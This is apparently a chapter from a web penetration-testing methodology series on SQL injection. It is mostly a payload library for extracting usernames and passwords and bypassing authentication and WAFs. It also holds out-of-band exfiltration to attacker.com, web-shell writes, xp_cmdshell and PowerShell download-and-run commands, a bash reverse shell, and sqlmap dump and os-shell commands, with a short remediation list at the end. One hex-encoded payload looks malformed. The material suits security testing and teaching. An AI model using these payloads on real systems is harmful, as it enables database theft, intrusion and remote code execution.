---
title: "SQL Injection (SQLi)"
date: 2026-02-24
draft: false
---

# SQL Injection (SQLi)

> **Severity**: Critical
> **CWE**: CWE-89
> **OWASP**: A03:2021 – Injection

---

## What Is SQL Injection?

SQL Injection occurs when user-supplied data is embedded into a SQL query without proper sanitization, allowing an attacker to manipulate the query's logic. The impact ranges from authentication bypass to full database dump, file read/write, and OS command execution — depending on the database engine and configuration.

### Injection Classes at a Glance

| Type | Data Returned | Detection |
|------|--------------|-----------|
| **Error-based** | Error messages reveal DB info | Syntax errors visible in response |
| **Union-based** | Data returned in response body | `ORDER BY` / `UNION` technique |
| **Boolean-based blind** | True/False behavioral difference | Response size or content change |
| **Time-based blind** | No output — only timing | `SLEEP()` / `WAITFOR DELAY` |
| **Out-of-Band (OOB)** | DNS/HTTP exfiltration | Collaborator / interactsh |
| **Second-order** | Payload stored, executed later | Multi-step flows |
| **Stacked queries** | Execute multiple statements | Depends on DB driver support |

---

## Attack Surface Map

### Entry Points to Test

```
# URL parameters:
/items?id=1
/search?q=admin
/user?name=john&sort=id

# POST body (form, JSON, XML):
{"username":"admin","password":"pass"}
username=admin&password=pass

# HTTP headers:
User-Agent: Mozilla/5.0
Referer: https://site.com/page
X-Forwarded-For: 127.0.0.1
Cookie: session=abc; user_id=1
X-Custom-Header: value

# REST paths:
/api/users/1
/api/product/electronics/laptop

# Search & filter fields
# Order/sort parameters
# Pagination: limit, offset, page
# File names in download endpoints
# GraphQL variables that hit SQL backend
# XML / SOAP bodies
# WebSocket messages
```

---

## Discovery Checklist

### Phase 1 — Passive Identification

- [ ] Map all parameters that interact with the server (URL, body, headers, cookies)
- [ ] Identify parameters that clearly reflect data from a database (user info, products, results)
- [ ] Note parameters used for filtering, ordering, searching, or paginating
- [ ] Check if numeric parameters can be replaced with expressions (`1+1`, `2-1`)
- [ ] Identify multi-step flows where input stored in step 1 is used in a query in step 2 (second-order)
- [ ] Review JavaScript for client-side constructed query strings sent to API
- [ ] Look for verbose error messages (stack traces, DB errors, query fragments)

### Phase 2 — Active Detection

- [ ] Inject a single quote `'` — observe error vs no error
- [ ] Inject `''` (escaped quote) — does the response return to normal?
- [ ] Inject `1 AND 1=1` vs `1 AND 1=2` — boolean difference?
- [ ] Inject `1 OR 1=1` — does result set expand?
- [ ] Inject `1; SELECT SLEEP(5)` — does response delay?
- [ ] Inject comment sequences: `--`, `#`, `/**/`, `/*!*/`
- [ ] Try numeric context: `1+1` returns same as `2`?
- [ ] Inject `ORDER BY 1`, `ORDER BY 100` — error on high number reveals column count
- [ ] Try `UNION SELECT NULL` with increasing NULLs until no error
- [ ] Test string context: `' OR '1'='1`
- [ ] Test time-based in all parameters including headers and cookies

### Phase 3 — Confirm & Escalate

- [ ] Determine injectable context (string, numeric, identifier)
- [ ] Determine database engine (error messages, behavior, functions)
- [ ] Find column count via `ORDER BY`
- [ ] Find printable columns via `UNION SELECT NULL,NULL,...`
- [ ] Extract DB version, current user, current database
- [ ] Enumerate databases → tables → columns → data
- [ ] Check for FILE privileges (MySQL: `LOAD_FILE`, `INTO OUTFILE`)
- [ ] Check for xp_cmdshell (MSSQL)
- [ ] Test OOB exfiltration (DNS via `load_file`, `UTL_HTTP`, `xp_dirtree`)
- [ ] Test stacked queries for write/exec capabilities

---

## Payload Library

### Section 1 — Detection & Syntax Break

```sql
-- Basic quote injection:
'
''
`
')
"
'))
"))

-- Comment terminators:
' --
' #
' /*
'/**/--
'/*!--*/

-- Numeric context:
1 AND 1=1
1 AND 1=2
1 OR 1=1
1 OR 1=2

-- Always-true / always-false:
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--

-- Expression injection (confirms evaluation):
1+1          -- should behave like 2
1*1
9-8

-- Nested quotes:
''''
''||''
```

### Section 2 — Column Count (ORDER BY)

```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
ORDER BY 100--          -- triggers error when > actual column count
ORDER BY 1,2,3--
ORDER BY 1 ASC--
ORDER BY 1 DESC--

-- With URL encoding:
' ORDER BY 1--          -- standard
' ORDER BY 1%23         -- # encoded
' ORDER BY 1%2f%2a      -- /* encoded
```

### Section 3 — Union-Based Extraction

```sql
-- Find number of columns (increase NULLs until no error):
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Find printable columns (replace NULL one at a time with string):
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Extract data (MySQL):
' UNION SELECT 1,version(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,@@datadir,3--
' UNION SELECT 1,@@version_compile_os,3--
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,':',password),3 FROM users--

-- PostgreSQL:
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,current_database(),NULL--
' UNION SELECT NULL,current_user,NULL--
' UNION SELECT NULL,string_agg(datname,','),NULL FROM pg_database--
' UNION SELECT NULL,string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'--
' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,string_agg(username||':'||password,','),NULL FROM users--

-- MSSQL:
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,db_name(),NULL--
' UNION SELECT NULL,user_name(),NULL--
' UNION SELECT NULL,(SELECT STRING_AGG(name,',') FROM master.dbo.sysdatabases),NULL--
' UNION SELECT NULL,(SELECT STRING_AGG(name,',') FROM sysobjects WHERE xtype='U'),NULL--

-- Oracle:
' UNION SELECT NULL,banner,NULL FROM v$version--
' UNION SELECT NULL,user,NULL FROM dual--
' UNION SELECT NULL,(SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY 1) FROM all_tables WHERE owner='APPS'),NULL FROM dual--
```

### Section 4 — Error-Based Extraction

#### MySQL Error-Based

```sql
-- extractvalue (returns value in error message):
' AND extractvalue(1,concat(0x7e,version()))--
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,user()))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,':',password) FROM users)))--

-- updatexml:
' AND updatexml(1,concat(0x7e,version()),1)--
' AND updatexml(1,concat(0x7e,(SELECT password FROM users WHERE username='admin' LIMIT 1)),1)--

-- floor/rand (old but reliable):
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

#### PostgreSQL Error-Based

```sql
-- cast to int:
' AND 1=cast(version() as int)--
' AND 1=cast((SELECT password FROM users LIMIT 1) as int)--

-- substring trick:
' AND 1=1/(SELECT 1 FROM (SELECT substring(username,1,1) FROM users LIMIT 1) x WHERE x.substring='a')--
```

#### MSSQL Error-Based

```sql
-- convert:
' AND 1=convert(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
' AND 1=convert(int,@@version)--

-- cast:
' AND 1=cast((SELECT TOP 1 password FROM users) as int)--
```

#### Oracle Error-Based

```sql
-- utl_inaddr (DNS lookup — triggers error with data):
' AND 1=utl_inaddr.get_host_address((SELECT version FROM v$instance))--

-- XMLType:
' AND 1=(SELECT UPPER(XMLType(chr(60)||chr(58)||version||chr(62))) FROM v$instance)--
```

### Section 5 — Boolean-Based Blind

```sql
-- Confirm boolean:
' AND 1=1--              -- true: same as normal response
' AND 1=2--              -- false: different/empty response

-- Extract data char by char:
' AND SUBSTRING(version(),1,1)='5'--
' AND SUBSTRING(version(),1,1)='8'--
' AND ASCII(SUBSTRING(version(),1,1))>50--
' AND ASCII(SUBSTRING(version(),1,1))=56--    -- binary search

-- Extract DB name:
' AND SUBSTRING(database(),1,1)='a'--
' AND LENGTH(database())=5--

-- Check if table exists:
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='admin_users')>0--

-- Check if row exists:
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--

-- Extract password of admin:
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

-- PostgreSQL boolean:
' AND SUBSTR(version(),1,1)='P'--
' AND (SELECT COUNT(*) FROM pg_tables WHERE tablename='users')>0--
```

### Section 6 — Time-Based Blind

```sql
-- MySQL:
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(1=2,SLEEP(5),0)--                           -- no delay (false)
' AND IF(SUBSTRING(version(),1,1)='8',SLEEP(5),0)--  -- delay if true
' AND IF(LENGTH(database())=10,SLEEP(5),0)--

-- PostgreSQL:
'; SELECT pg_sleep(5)--
' AND (SELECT 1 FROM pg_sleep(5))--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND (SELECT CASE WHEN SUBSTR(version(),1,1)='P' THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- MSSQL:
'; WAITFOR DELAY '0:0:5'--
' AND IF(1=1) WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--

-- Oracle:
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM DUAL)=1--

-- SQLite:
' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--   -- heavy computation delay
```

### Section 7 — Out-of-Band (OOB) Exfiltration

```sql
-- MySQL (requires FILE privilege):
' AND LOAD_FILE(concat('\\\\',version(),'.',user(),'.attacker.com\\share'))--
' AND LOAD_FILE(concat(0x5c5c5c5c,version(),0x2e,database(),0x2e,0x6174746163b6572,0x2e636f6d5c5c61))--

-- MSSQL (xp_dirtree — DNS OOB):
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
' AND 1=(SELECT 1 FROM OPENROWSET('SQLOLEDB','server=attacker.com;uid=sa;pwd=sa','SELECT 1'))--

-- MSSQL (DNS exfil with data):
'; DECLARE @q NVARCHAR(1000); SET @q='\\'+@@version+'.attacker.com\share'; EXEC xp_dirtree @q--

-- Oracle (UTL_HTTP):
' AND 1=(SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM DUAL)--

-- Oracle (UTL_FILE / DNS):
' AND 1=(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL)||'.attacker.com') FROM DUAL)--

-- PostgreSQL (COPY):
'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?d=$(version)'--
'; CREATE TABLE tmp(data text); COPY tmp FROM PROGRAM 'curl -s http://attacker.com/'--
```

### Section 8 — Stacked Queries & File R/W

#### MySQL File Read/Write

```sql
-- Read file (requires FILE privilege):
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT LOAD_FILE('/var/www/html/config.php')--
' UNION SELECT LOAD_FILE('/root/.ssh/id_rsa')--

-- Write file (requires FILE + write permissions):
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT '' INTO DUMPFILE '/var/www/html/shell.php'--

-- Write with newlines encoded:
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e INTO OUTFILE '/var/www/html/shell.php'--
```

#### MSSQL xp_cmdshell

```sql
-- Enable xp_cmdshell (requires sysadmin):
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

-- Execute OS command:
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://attacker.com/shell.exe C:\shell.exe && C:\shell.exe'--

-- Read file via xp_cmdshell:
'; EXEC xp_cmdshell 'type C:\Windows\win.ini'--

-- MSSQL reverse shell via PowerShell:
'; EXEC xp_cmdshell 'powershell -c "iex(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'--
```

#### PostgreSQL RCE

```sql
-- COPY TO PROGRAM (PostgreSQL 9.3+, requires superuser):
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out'--
'; COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'--

-- Large object execution:
'; SELECT lo_import('/etc/passwd')--
'; SELECT lo_export(16384,'/var/www/html/shell.php')--

-- Extension loading (superuser):
'; CREATE EXTENSION IF NOT EXISTS plpython3u;--
'; CREATE OR REPLACE FUNCTION sys(cmd TEXT) RETURNS TEXT AS $$ import subprocess; return subprocess.getoutput(cmd) $$ LANGUAGE plpython3u;--
'; SELECT sys('id');--
```

---

### Section 9 — WAF Bypass Techniques

#### Comment Injection (break keywords)

```sql
-- MySQL inline comments:
UN/**/ION SEL/**/ECT
UN/*!50000ION*/ SELECT
UNION/*bypass*/SELECT
SEL/**/ECT 1,2,3

-- Equivalent comments:
'/**/OR/**/1=1--
'/*!OR*/1=1--

-- Version-specific bypass:
/*!UNION*//*!SELECT*/1,2,3--
```

#### Case & Encoding Bypasses

```sql
-- Case variation:
uNiOn SeLeCt
UnIoN SeLeCT
UNION%20SELECT

-- URL encoding:
%55NION%20%53ELECT
UNION%0aSELECT          -- newline instead of space
UNION%09SELECT           -- tab instead of space
UNION%0cSELECT           -- form feed

-- Double URL encode:
%2555NION%2520SELECT

-- HTML entity (when input reflected in HTML context):
&#85;NION &#83;ELECT
```

#### Space Substitution

```sql
-- Replace spaces with:
UNION/**/SELECT
UNION%09SELECT          -- tab
UNION%0aSELECT          -- newline
UNION%0cSELECT          -- form feed
UNION%0dSELECT          -- carriage return
UNION%a0SELECT          -- non-breaking space
UNION(1)                -- parentheses (some contexts)
```

#### String Bypass (when quotes filtered)

```sql
-- Hex encoding:
SELECT 0x61646d696e          -- 'admin'
WHERE username=0x61646d696e

-- char() function:
WHERE username=char(97,100,109,105,110)   -- MySQL
WHERE username=chr(97)||chr(100)||chr(109)||chr(105)||chr(110)  -- PostgreSQL/Oracle

-- concat:
WHERE username=concat(char(97),char(100),char(109))

-- Dynamic query:
'; EXEC('SEL'+'ECT * FROM users')--   -- MSSQL string concat

-- Bypass with LIKE/wildcard:
WHERE username LIKE 0x61646d696e
```

#### Filter Bypass for Specific Keywords

```sql
-- "UNION" blocked:
UNiOn, UnIoN, UNION/**/, /*!UNION*/

-- "SELECT" blocked:
SELect, sElEcT, SEL/**/ECT, /*!SELECT*/

-- "WHERE" blocked:
WHere, wHeRe, /*!WHERE*/

-- "AND/OR" blocked:
&&, ||, %26%26, %7c%7c

-- "=" blocked:
LIKE, REGEXP, BETWEEN 'a' AND 'b', IN('admin')
WHERE username BETWEEN 'admin' AND 'admin'

-- Comparison operators:
> (greater than)
< (less than)
!= (not equal)
<> (not equal)
```

#### Second-Order Injection

```sql
-- Step 1: Register with payload as username:
Username: admin'--

-- Step 2: Application stores raw input in DB
-- Step 3: Password change query uses stored username:
UPDATE users SET password='newpass' WHERE username='admin'--'

-- Effect: password of 'admin' changed, not the attacker's account

-- Common second-order sinks:
-- Profile update
-- Password reset
-- Email preferences
-- Log viewers (stored → viewed by admin → executed)
```

---

### Section 10 — Database Fingerprinting

```sql
-- MySQL:
SELECT @@version          -- 8.0.x
SELECT version()
SELECT @@datadir
SELECT @@basedir
'  →  error mentions "MySQL" or "MariaDB"

-- PostgreSQL:
SELECT version()          -- PostgreSQL 14.x
SELECT current_setting('server_version')
SELECT pg_sleep(0)        -- function exists

-- MSSQL:
SELECT @@version          -- Microsoft SQL Server 2019
SELECT @@servername
SELECT getdate()
WAITFOR DELAY '0:0:0'

-- Oracle:
SELECT banner FROM v$version
SELECT * FROM v$instance
SELECT user FROM dual
dual table exists

-- SQLite:
SELECT sqlite_version()
SELECT typeof(1)

-- Differentiate MySQL vs MSSQL:
-- MySQL:   SELECT 1+1  → 2
-- MSSQL:   SELECT 1+1  → 2   (same, use other methods)
-- MySQL:   # comment works
-- MSSQL:   # does NOT work, use --

-- Universal detection order:
'  →  if error: note DB type from error message
' AND SLEEP(5)--           → MySQL
' AND pg_sleep(5)--        → PostgreSQL
' WAITFOR DELAY '0:0:5'--  → MSSQL
' AND 1=dbms_pipe.receive_message('a',5)--  → Oracle
```

---

### Section 11 — Authentication Bypass

```sql
-- Classic:
admin'--
admin' #
' OR 1=1--
' OR '1'='1
' OR 1=1#
' OR 1=1/*

-- Username field:
admin'/*
') OR ('1'='1
') OR ('1'='1'--

-- With password field both:
Username: admin'--
Password: anything

-- Bypass with AND/OR logic:
' OR 1=1 LIMIT 1--
' OR 1=1 ORDER BY 1--
') OR (1=1)--
1' OR '1'='1

-- Time-based auth bypass (extract admin hash):
' AND IF(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--
```

---

## Tools

```bash
# SQLMap — automated detection and exploitation:
sqlmap -u "https://target.com/items?id=1" --dbs
sqlmap -u "https://target.com/items?id=1" -D dbname --tables
sqlmap -u "https://target.com/items?id=1" -D dbname -T users --dump
sqlmap -u "https://target.com/items?id=1" --os-shell
sqlmap -u "https://target.com/items?id=1" --file-read=/etc/passwd
sqlmap -u "https://target.com/items?id=1" --level=5 --risk=3
sqlmap -u "https://target.com/items?id=1" --technique=BEU --dbms=mysql
sqlmap -u "https://target.com/items?id=1" --tamper=space2comment,randomcase

# SQLMap with POST:
sqlmap -u "https://target.com/login" --data="username=admin&password=pass" -p username

# SQLMap from Burp request file:
sqlmap -r request.txt --level=5 --risk=3

# SQLMap cookies:
sqlmap -u "https://target.com/" --cookie="session=abc; id=1" -p id

# SQLMap headers:
sqlmap -u "https://target.com/" --headers="User-Agent: *" --level=3

# Tamper scripts (WAF bypass):
--tamper=apostrophemask        # ' → %EF%BC%87
--tamper=base64encode          # encodes payload
--tamper=between               # > → BETWEEN
--tamper=bluecoat              # space → %09
--tamper=charencode            # URL encodes each char
--tamper=charunicodeencode     # Unicode encodes
--tamper=equaltolike           # = → LIKE
--tamper=greatest              # > → GREATEST
--tamper=halfversionedmorekeywords  # MySQL < 5.1 bypass
--tamper=htmlencode            # HTML entities
--tamper=ifnull2ifisnull       # IFNULL → IF(ISNULL)
--tamper=modsecurityversioned  # versioned comments
--tamper=multiplespaces        # multiple spaces
--tamper=nonrecursivereplacement  # double keywords
--tamper=percentage            # %S%E%L%E%C%T
--tamper=randomcase            # random case
--tamper=space2comment         # space → /**/
--tamper=space2dash            # space → --\n
--tamper=space2hash            # space → #\n (MySQL)
--tamper=space2morehash        # space → #hash\n
--tamper=space2mssqlblank      # space → MS-specific blank
--tamper=space2mysqlblank      # space → MySQL blank
--tamper=space2plus            # space → +
--tamper=sp_password           # appends sp_password (log hiding MSSQL)
--tamper=unmagicquotes         # \' → %bf%27
--tamper=versionedkeywords     # keywords → /*!keyword*/
--tamper=versionedmorekeywords # more keywords versioned
```

---

## Remediation Reference

- **Parameterized queries / Prepared statements**: the only reliable fix — never concatenate user input into SQL
- **ORM with safe query builders**: use the ORM's parameterization, never raw string interpolation
- **Input validation**: whitelist permitted characters (digits only for IDs); this is a secondary defense
- **Least privilege**: database account should have only the permissions required — no FILE, no xp_cmdshell
- **WAF**: useful as defense-in-depth but not a substitute for parameterized queries
- **Error handling**: never expose raw SQL errors to users — log internally, return generic message

---

*Part of the Web Application Penetration Testing Methodology series.*
*Previous: [Index](WEB_VULN_INDEX.md) | Next: [Chapter 02 — NoSQL Injection](02_NoSQLi.md)*
